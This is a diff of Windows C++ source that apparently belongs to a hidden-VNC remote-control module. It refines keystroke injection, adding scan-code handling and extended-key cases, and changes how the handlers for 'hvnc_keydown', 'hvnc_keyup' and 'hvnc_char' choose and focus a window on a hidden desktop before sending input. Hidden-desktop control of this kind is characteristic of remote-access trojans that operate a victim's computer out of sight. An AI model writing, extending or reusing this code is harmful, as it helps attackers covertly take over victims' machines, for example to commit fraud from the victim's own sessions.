@@ -783,15 +783,15 @@ static bool send_key_input(WORD vk, bool down) {
     INPUT input{};
     input.type = INPUT_KEYBOARD;
     input.ki.wVk = vk;
-    input.ki.wScan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
+    input.ki.wScan = (WORD)MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     input.ki.dwFlags = (down ? 0 : KEYEVENTF_KEYUP);
-    if (input.ki.wScan != 0) input.ki.dwFlags |= KEYEVENTF_SCANCODE;
 
     // Handle extended keys
     switch (vk) {
         case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
         case VK_PRIOR: case VK_NEXT: case VK_END: case VK_HOME:
         case VK_INSERT: case VK_DELETE: case VK_DIVIDE: case VK_NUMLOCK:
+        case VK_RCONTROL: case VK_RMENU:
             input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
             break;
     }
@@ -938,10 +938,16 @@ static void input_loop() {
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
 
-            // Ensure focus is on the hidden desktop's foreground window
-            HWND hFore = GetForegroundWindow();
-            if (hFore) {
-                SetForegroundWindow(hFore);
+            HWND hTarget = g_hCurrentFocus;
+            if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
+            if (!hTarget || !IsWindow(hTarget)) hTarget = g_hLastWindow;
+
+            if (hTarget && IsWindow(hTarget)) {
+                HWND hRoot = GetAncestor(hTarget, GA_ROOT);
+                if (hRoot) {
+                    SetForegroundWindow(hRoot);
+                    if (hTarget != hRoot) SetFocus(hTarget);
+                }
             }
 
             if (action == "hvnc_keydown") {
